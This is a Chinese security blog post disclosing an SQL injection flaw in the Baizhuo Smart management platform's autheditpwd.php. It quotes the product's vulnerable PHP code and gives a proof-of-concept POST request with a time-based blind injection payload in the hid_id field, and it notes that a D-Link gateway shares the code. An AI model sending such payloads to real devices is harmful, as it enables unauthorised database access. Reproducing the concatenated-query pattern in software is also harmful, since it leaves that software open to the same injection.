---
title: "百卓Smart管理平台 autheditpwd.php SQL注入漏洞"
source: https://mrxn.net/jswz/baizhuosmart-autheditpwd-sqli.html
asset_dir: assets/百卓smart管理平台-autheditpwd.php-sql注入漏洞
---

# 百卓Smart管理平台 autheditpwd.php SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/17 17:10
- 1019浏览
- [0评论](#comment)
- 13分钟阅读

深入探索

计算机安全

百卓网络

SQL

---

# 漏洞简介

百卓Smart管理平台是北京百卓网络技术有限公司(以下简称百卓网络)的一款安全网关产品，是一家致力于构建下一代安全互联网的高科技企业。百卓Smart管理平台 autheditpwd.php 接口处存在SQL注入漏洞，攻击者除了可以利用[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 漏洞分析

先看今天主角 autheditpwd.php 业务逻辑实现代码

```
<?php 

if(isset($_GET['id'])) $get_id = $_GET['id'];
if(isset($_POST['mode'])) $post_mode = $_POST['mode'];
if($post_mode == "edit")
{
    conn();
    $post_id = $_POST['hid_id'];
    $post_oldpwd = $_POST['oldpwd'];
    $sql = "select * from tb_web_accounts where id = $post_id and user_pwd = '$post_oldpwd'";
    $result = mysql_query($sql);
    $num = mysql_num_rows($result);
    if($num < 1)    //没有记录
    {
        alert("原密码不对","autheditpwd.php?id=$post_id");
        exit();
    }
    $post_pwd = $_POST['pwd'];
    $sql = "update tb_web_accounts set user_pwd = $post_pwd where id = $post_id";
    $result = mysql_query($sql);
    if(!$result)
    {
        alert("修改失败!","autheditpwd.php?id=$post_id");
        exit();
    }
    alert_close("修改成功!");
}
```

一眼丁真！`$post_id`存在[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。  
`$post_id`是直接拼接进SQL语句中，从而造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")。  
要想进入此逻辑也简单，只需要 `$post_mode` 等于 `edit` 即可！开干！

代码安全审计

# 漏洞复现

```
POST /autheditpwd.php HTTP/1.1
Host: smart.mrxn.net
Content-Type: application/x-www-form-urlencoded

oldpwd=1&pwd=1&confirmpwd=1&mode=edit&hid_id=(select*from(select(sleep(4)))a)
```

深入探索

网络安全会议

安全认证考试

Windows安全工具

[[![百卓Smart管理平台 autheditpwd.php SQL注入漏洞](images/img-001-8b7b67d851fc.png)](https://mrxn.net/content/uploadfile/202501/49cb1737105043.png)](https://mrxn.net/content/uploadfile/202501/49cb1737105043.png)

PS: D-link某款上网行为审计网关也是这套OEM！

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.漏洞分析](#toc-2-)
- [3.漏洞复现](#toc-3-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
